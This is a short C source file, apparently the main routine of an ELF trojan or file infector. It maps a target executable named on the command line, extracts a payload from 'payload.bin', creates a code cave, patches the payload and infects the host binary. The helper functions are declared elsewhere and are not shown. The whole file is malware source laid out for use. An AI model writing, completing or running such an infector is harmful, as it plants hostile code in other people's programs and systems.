#include "trojan.h"
#include<stdio.h>
#include<errno.h>
#include<elf.h>
#include<unistd.h>
#include<stdlib.h>
#include<sys/mman.h>
#include<sys/stat.h>
#include<fcntl.h>


int main(int argc,char **argv)
{
	int fd;
	open_map_file(&fd,argv[1]);

	extract_payload("payload.bin");

	create_code_cave();

	patch_payload();

	infect_host();

	return 0;
}
